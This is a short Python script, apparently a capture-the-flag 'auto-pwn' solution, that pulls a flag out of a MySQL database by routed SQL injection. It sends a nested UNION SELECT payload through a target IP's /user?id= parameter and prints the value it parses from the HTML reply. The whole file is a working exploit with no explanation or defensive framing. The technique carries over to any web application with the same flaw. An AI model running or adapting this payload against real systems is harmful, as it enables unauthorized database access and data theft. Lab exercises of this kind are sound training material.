#!/usr/bin/env python3

#This script gets the flag from a MySQL database via routed SQL injection

import requests
from bs4 import BeautifulSoup
import argparse

parser = argparse.ArgumentParser(description='Flag 4 Auto-Pwn')
parser.add_argument('-i', help='Target IP Address (Eg: 10.10.10.10)', required=True)
args = parser.parse_args()

IP = args.i
injection = "-1 union all select \"3 union select 1,flag,3,4 from flag\",2,3 from information_schema.tables where table_schema=database()-- -"
	
url = "http://" + IP + "/user?id=3" + injection
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = requests.get(url, headers = headers)
	
html = r.text
soup = BeautifulSoup(html, 'html.parser')
match = soup.find("ul")
flag = match.li.a.text

print(flag)